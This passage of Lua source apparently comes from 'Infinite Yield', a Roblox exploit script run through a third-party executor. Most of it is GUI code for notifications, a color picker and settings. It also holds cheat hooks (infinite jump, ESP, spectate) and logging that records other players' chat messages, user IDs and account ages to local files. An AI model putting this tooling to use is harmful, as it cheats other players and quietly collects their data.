			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
		end
	end

	pinNotification = nil
	local notifyCount = 0
	function notify(text,text2,length)
		spawn(function()
			local LnotifyCount = notifyCount+1
			local notificationPinned = false
			notifyCount = notifyCount+1
			if pinNotification then pinNotification:Disconnect() end
			pinNotification = PinButton.MouseButton1Click:Connect(function()
				spawn(function()
					pinNotification:Disconnect()
					notificationPinned = true
					Title_2.BackgroundTransparency = 1
					wait(0.5)
					Title_2.BackgroundTransparency = 0
				end)
			end)
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			local closepressed = false
			if text2 then
				Title_2.Text = text
				Text_2.Text = text2
			else
				Title_2.Text = 'Notification'
				Text_2.Text = text
			end
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)
			CloseButton.MouseButton1Click:Connect(function()
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				closepressed = true
				pinNotification:Disconnect()
			end)
			if length and isNumber(length) then
				wait(length)
			else
				wait(10)
			end
			if LnotifyCount == notifyCount then
				if closepressed == false and notificationPinned == false then
					pinNotification:Disconnect()
					Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				end
				notifyCount = 0
			end
		end)
	end

	local lastMessage = nil
	local lastLabel = nil
	local dupeCount = 1
	function CreateLabel(Name, Text)
		if lastMessage == Name..Text then
			dupeCount = dupeCount+1
			lastLabel.Text = Time()..' - ['..Name..']: '..Text..' (x'..dupeCount..')'
		else
			if dupeCount > 1 then dupeCount = 1 end
			if #scroll_2:GetChildren() >= 2546 then
				scroll_2:ClearAllChildren()
			end
			local alls = 0
			for i,v in pairs(scroll_2:GetChildren()) do
				if v then
					alls = v.Size.Y.Offset + alls
				end
				if not v then
					alls = 0
				end
			end
			local tl = Instance.new('TextLabel')
			lastMessage = Name..Text
			lastLabel = tl
			tl.Name = Name
			tl.Parent = scroll_2
			tl.ZIndex = 10
			tl.Text = Time().." - ["..Name.."]: "..Text
			tl.Size = UDim2.new(0,322,0,84)
			tl.BackgroundTransparency = 1
			tl.BorderSizePixel = 0
			tl.Font = "SourceSans"
			tl.Position = UDim2.new(-1,0,0,alls)
			tl.TextTransparency = 1
			tl.TextScaled = false
			tl.TextSize = 14
			tl.TextWrapped = true
			tl.TextXAlignment = "Left"
			tl.TextYAlignment = "Top"
			tl.TextColor3 = currentText1
			tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
			table.insert(text1,tl)
			scroll_2.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
			scroll_2.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+tl.TextBounds.Y)
			tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
			for i = 0,50 do wait(0.05)
				tl.TextTransparency = tl.TextTransparency - 0.05
			end
			tl.TextTransparency = 0
		end
	end

	function CreateJoinLabel(plr,ID)
		if #scroll_3:GetChildren() >= 2546 then
			scroll_3:ClearAllChildren()
		end
		local infoFrame = Instance.new("Frame")
		local info1 = Instance.new("TextLabel")
		local info2 = Instance.new("TextLabel")
		local ImageLabel_3 = Instance.new("ImageLabel")
		infoFrame.Name = randomString()
		infoFrame.Parent = scroll_3
		infoFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		infoFrame.BackgroundTransparency = 1
		infoFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		infoFrame.Size = UDim2.new(1, 0, 0, 50)
		info1.Name = randomString()
		info1.Parent = infoFrame
		info1.BackgroundTransparency = 1
		info1.BorderSizePixel = 0
		info1.Position = UDim2.new(0, 45, 0, 0)
		info1.Size = UDim2.new(0, 135, 1, 0)
		info1.ZIndex = 10
		info1.Font = Enum.Font.SourceSans
		info1.FontSize = Enum.FontSize.Size14
		info1.Text = "Username: "..plr.Name.."\nJoined Server: "..Time()
		info1.TextColor3 = Color3.new(1, 1, 1)
		info1.TextWrapped = true
		info1.TextXAlignment = Enum.TextXAlignment.Left
		info2.Name = randomString()
		info2.Parent = infoFrame
		info2.BackgroundTransparency = 1
		info2.BorderSizePixel = 0
		info2.Position = UDim2.new(0, 185, 0, 0)
		info2.Size = UDim2.new(0, 140, 1, -5)
		info2.ZIndex = 10
		info2.Font = Enum.Font.SourceSans
		info2.FontSize = Enum.FontSize.Size14
		info2.Text = "User ID: "..ID.."\nAccount Age: "..plr.AccountAge.."\nJoined Roblox: Loading..."
		info2.TextColor3 = Color3.new(1, 1, 1)
		info2.TextWrapped = true
		info2.TextXAlignment = Enum.TextXAlignment.Left
		info2.TextYAlignment = Enum.TextYAlignment.Center
		ImageLabel_3.Parent = infoFrame
		ImageLabel_3.BackgroundTransparency = 1
		ImageLabel_3.BorderSizePixel = 0
		ImageLabel_3.Size = UDim2.new(0, 45, 1, 0)
		ImageLabel_3.Image = game.Players:GetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
		scroll_3.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+infoFrame.AbsoluteSize.Y)
		wait()
		local user = game:HttpGet("https://users.roblox.com/v1/users/"..ID)
		local json = game:GetService("HttpService"):JSONDecode(user)
		local date = json["created"]:sub(1,10)
		local splitDates = string.split(date,"-")
		info2.Text = string.gsub(info2.Text, "Loading...",splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
	end

	IYMouse.KeyDown:Connect(function(Key)
		if (Key==prefix) then
			Cmdbar:CaptureFocus()
			spawn(function()
				repeat Cmdbar.Text = '' until Cmdbar.Text == ''
			end)
			maximizeHolder()
		elseif infJump == true and Key == " " then
			Players.LocalPlayer.Character.Humanoid:ChangeState(3)
		end
	end)

	local lastMinimizeReq = 0
	Holder.MouseEnter:Connect(function()
		lastMinimizeReq = 0
		maximizeHolder()
	end)

	Holder.MouseLeave:Connect(function()
		if not Cmdbar:IsFocused() then
			local reqTime = tick()
			lastMinimizeReq = reqTime
			wait(1)
			if lastMinimizeReq ~= reqTime then return end
			if not Cmdbar:IsFocused() then
				minimizeHolder()
			end
		end
	end)

	function updateColors(color,ctype)
		if ctype == shade1 then
			for i,v in pairs(shade1) do
				v.BackgroundColor3 = color
			end
			currentShade1 = color
		elseif ctype == shade2 then
			for i,v in pairs(shade2) do
				v.BackgroundColor3 = color
			end
			currentShade2 = color
		elseif ctype == shade3 then
			for i,v in pairs(shade3) do
				v.BackgroundColor3 = color
			end
			currentShade3 = color
		elseif ctype == text1 then
			for i,v in pairs(text1) do
				v.TextColor3 = color
				if v:IsA("TextBox") then
					v.PlaceholderColor3 = color	
				end
			end
			currentText1 = color
		elseif ctype == text2 then
			for i,v in pairs(text2) do
				v.TextColor3 = color
			end
			currentText2 = color
		elseif ctype == scroll then
			for i,v in pairs(scroll) do
				v.ScrollBarImageColor3 = color
			end
			currentScroll = color
		end
	end

	local colorpickerOpen = false
	ColorsButton.MouseButton1Click:Connect(function()
		cache_currentShade1 = currentShade1
		cache_currentShade2 = currentShade2
		cache_currentShade3 = currentShade3
		cache_currentText1 = currentText1
		cache_currentText2 = currentText2
		cache_currentScroll = currentScroll
		if not colorpickerOpen then
			colorpickerOpen = true
			picker = game:GetObjects("rbxassetid://4908465318")[1]
			picker.Name = randomString()
			picker.Parent = PARENT

			local ColorPicker do
				ColorPicker = {}

				ColorPicker.new = function()
					local newMt = setmetatable({},{})

					local pickerGui = picker.ColorPicker
					local pickerTopBar = pickerGui.TopBar
					local pickerExit = pickerTopBar.Exit
					local pickerFrame = pickerGui.Content
					local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
					local colorStrip = pickerFrame.ColorStrip
					local previewFrame = pickerFrame.Preview
					local basicColorsFrame = pickerFrame.BasicColors
					local customColorsFrame = pickerFrame.CustomColors
					local defaultButton = pickerFrame.Default
					local cancelButton = pickerFrame.Cancel
					local shade1Button = pickerFrame.Shade1
					local shade2Button = pickerFrame.Shade2
					local shade3Button = pickerFrame.Shade3
					local text1Button = pickerFrame.Text1
					local text2Button = pickerFrame.Text2
					local scrollButton = pickerFrame.Scroll

					local colorScope = colorSpace.Scope
					local colorArrow = pickerFrame.ArrowFrame.Arrow

					local hueInput = pickerFrame.Hue.Input
					local satInput = pickerFrame.Sat.Input
					local valInput = pickerFrame.Val.Input

					local redInput = pickerFrame.Red.Input
					local greenInput = pickerFrame.Green.Input
					local blueInput = pickerFrame.Blue.Input

					local mouse = IYMouse

					local hue,sat,val = 0,0,1
					local red,green,blue = 1,1,1
					local chosenColor = Color3.new(0,0,0)

					local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
					local customColors = {}

					dragGUI(picker)

					local function updateColor(noupdate)
						local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
						local hsvColor = Color3.fromHSV(hue,sat,val)

						if noupdate == 2 or not noupdate then
							hueInput.Text = tostring(math.ceil(359*hue))
							satInput.Text = tostring(math.ceil(255*sat))
							valInput.Text = tostring(math.floor(255*val))
						end
						if noupdate == 1 or not noupdate then
							redInput.Text = tostring(math.floor(255*red))
							greenInput.Text = tostring(math.floor(255*green))
							blueInput.Text = tostring(math.floor(255*blue))
						end

						chosenColor = Color3.new(red,green,blue)

						colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
						colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
						colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
						previewFrame.BackgroundColor3 = chosenColor

						newMt.Color = chosenColor
						if newMt.Changed then newMt:Changed(chosenColor) end
					end

					local function colorSpaceInput()
						local relativeX = mouse.X - colorSpace.AbsolutePosition.X
						local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y

						if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end

						hue = (219 - relativeX)/219
						sat = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function colorStripInput()
						local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

						val = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function hookButtons(frame,func)
						frame.ArrowFrame.Up.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum + 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum + 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Up.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 1
							end
						end)

						frame.ArrowFrame.Down.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum - 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum - 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Down.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 1
							end
						end)
					end

					colorSpace.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorSpaceInput()
								end
							end)

							colorSpaceInput()
						end
					end)

					colorStrip.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorStripInput()
								end
							end)

							colorStripInput()
						end
					end)

					local function updateHue(str)
						local num = tonumber(str)
						if num then
							hue = math.clamp(math.floor(num),0,359)/359
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							hueInput.Text = tostring(hue*359)
							updateColor(1)
						end
					end
					hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)

					local function updateSat(str)
						local num = tonumber(str)
						if num then
							sat = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							satInput.Text = tostring(sat*255)
							updateColor(1)
						end
					end
					satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)

					local function updateVal(str)
						local num = tonumber(str)
						if num then
							val = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							valInput.Text = tostring(val*255)
							updateColor(1)
						end
					end
					valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)

					local function updateRed(str)
						local num = tonumber(str)
						if num then
							red = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							redInput.Text = tostring(red*255)
							updateColor(2)
						end
					end
					redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)

					local function updateGreen(str)
						local num = tonumber(str)
						if num then
							green = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							greenInput.Text = tostring(green*255)
							updateColor(2)
						end
					end
					greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)

					local function updateBlue(str)
						local num = tonumber(str)
						if num then
							blue = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							blueInput.Text = tostring(blue*255)
							updateColor(2)
						end
					end
					blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)

					local colorChoice = Instance.new("TextButton")
					colorChoice.Name = "Choice"
					colorChoice.Size = UDim2.new(0,25,0,18)
					colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
					colorChoice.Text = ""
					colorChoice.AutoButtonColor = false
					colorChoice.ZIndex = 10

					local row = 0
					local column = 0
					for i,v in pairs(basicColors) do
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = v
						newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							red,green,blue = v.r,v.g,v.b
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							updateColor()
						end)	

						newColor.Parent = basicColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					row = 0
					column = 0
					for i = 1,12 do
						local color = customColors[i] or Color3.new(0,0,0)
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = color
						newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							local curColor = customColors[i] or Color3.new(0,0,0)
							red,green,blue = curColor.r,curColor.g,curColor.b
							hue,sat,val = Color3.toHSV(curColor)
							updateColor()
						end)

						newColor.MouseButton2Click:Connect(function()
							customColors[i] = chosenColor
							newColor.BackgroundColor3 = chosenColor
						end)

						newColor.Parent = customColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					shade1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade1) end end)
					shade1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
					shade1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)

					shade2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade2) end end)
					shade2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
					shade2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)

					shade3Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade3) end end)
					shade3Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
					shade3Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)

					text1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text1) end end)
					text1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
					text1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)

					text2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text2) end end)
					text2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
					text2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)

					scrollButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,scroll) end end)
					scrollButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
					scrollButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)

					cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end end)
					cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
					cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)

					defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end end)
					defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
					defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)

					pickerExit.MouseButton1Click:Connect(function()
						picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
					end)

					updateColor()

					newMt.SetColor = function(self,color)
						red,green,blue = color.r,color.g,color.b
						hue,sat,val = Color3.toHSV(color)
						updateColor()
					end

					return newMt
				end
			end

			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)

			local Npicker = ColorPicker.new()
			Npicker.Confirm = function(self,color,ctype) updateColors(color,ctype) wait() updatesaves() end
			Npicker.Cancel = function(self)
				updateColors(cache_currentShade1,shade1)
				updateColors(cache_currentShade2,shade2)
				updateColors(cache_currentShade3,shade3)
				updateColors(cache_currentText1,text1)
				updateColors(cache_currentText2,text2)
				updateColors(cache_currentScroll,scroll)
				wait()
				updatesaves()
			end
			Npicker.Default = function(self)
				updateColors(Color3.fromRGB(36, 36, 37),shade1)
				updateColors(Color3.fromRGB(46, 46, 47),shade2)
				updateColors(Color3.fromRGB(78, 78, 79),shade3)
				updateColors(Color3.new(1, 1, 1),text1)
				updateColors(Color3.new(0, 0, 0),text2)
				updateColors(Color3.fromRGB(78,78,79),scroll)
				wait()
				updatesaves()
			end
		else
			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
		end
	end)


	SettingsButton.MouseButton1Click:Connect(function()
		if SettingsOpen == false then SettingsOpen = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
			CMDsF.Visible = false
		else SettingsOpen = false
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
		end
	end)

	On.MouseButton1Click:Connect(function()
		if StayOpen == false then StayOpen = true
			On.BackgroundTransparency = 0
		else StayOpen = false
			On.BackgroundTransparency = 1
		end
		updatesaves()
	end)

	Clear.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_2:GetChildren()) do
			child:Destroy()
		end
		scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Toggle.MouseButton1Down:Connect(function()
		if logsEnabled then
			logsEnabled = false
			Toggle.Text = 'Disabled'
			updatesaves()
		else
			logsEnabled = true
			Toggle.Text = 'Enabled'
			updatesaves()
		end
	end)

	Toggle_2.MouseButton1Down:Connect(function()
		if jLogsEnabled then
			jLogsEnabled = false
			Toggle_2.Text = 'Disabled'
			updatesaves()
		else
			jLogsEnabled = true
			Toggle_2.Text = 'Enabled'
			updatesaves()
		end
	end)

	selectChat.MouseButton1Down:Connect(function()
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
	end)

	selectJoin.MouseButton1Down:Connect(function()
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
	end)

	if not writefileExploit() then
		notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
	end

	ChatLog = function(plr)
		plr.Chatted:Connect(function(Message)
			if logsEnabled == true then
				CreateLabel(plr.Name,Message)
			end
		end)
	end

	JoinLog = function(plr)
		if jLogsEnabled == true then
			CreateJoinLabel(plr,plr.UserId)
		end
	end

	SaveChatlogs.MouseButton1Down:Connect(function()
		if writefileExploit() then
			if #scroll_2:GetChildren() > 0 then
				notify("Loading",'Hold on a sec')
				local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
				local writelogs = '-- Infinite Yield Chat logs for "'..placeName..'"\n'
				for _, child in pairs(scroll_2:GetChildren()) do
					writelogs = writelogs..'\n'..child.Text
				end
				local writelogsFile = tostring(writelogs)
				local fileext = 0
				local function nameFile()
					local file
					pcall(function() file = readfile(placeName..' Chat Logs ('..fileext..').txt') end)
					if file then
						fileext = fileext+1
						nameFile()
					else
						writefileCooldown(placeName..' Chat Logs ('..fileext..').txt', writelogsFile)
					end
				end
				nameFile()
				notify('Chat Logs','Saved chat logs to the workspace folder within your exploit folder.')
			end
		else
			notify('Chat Logs','Your exploit does not support write file. You cannot save chat logs.')
		end
	end)

	for _, plr in pairs(Players:GetChildren()) do
		if plr.ClassName == "Player" then
			ChatLog(plr)
		end
	end

	Players.PlayerRemoving:Connect(function(player)
		if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name..'_LC') then
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' or v.Name == player.Name..'_CHMS' then
					v:Destroy()
				end
			end
		end
		if viewing ~= nil and player == viewing then
			workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
			viewing = nil
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			notify('Spectate','View turned off (player left)')
		end
	end)

	Exit.MouseButton1Down:Connect(function()
		logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
	end)

	Hide.MouseButton1Down:Connect(function()
		if logs.Position ~= UDim2.new(0, 0, 1, -20) then
			logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
		else
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end
	end)

	EventBind.MouseButton1Click:Connect(function()
		eventEditor.Frame:TweenPosition(UDim2.new(0.5,-175,0.5,-101), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Add.MouseButton1Click:Connect(function()
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
	end)

	Delete.MouseButton1Click:Connect(function()
		binds = {}
		refreshbinds()
		updatesaves()
		notify('Keybinds Updated','Removed all keybinds')
	end)

	Close_2.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Aliases.MouseButton1Click:Connect(function()
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close_3.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Positions.MouseButton1Click:Connect(function()
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	local selectionBox = Instance.new("SelectionBox")
	selectionBox.Name = randomString()
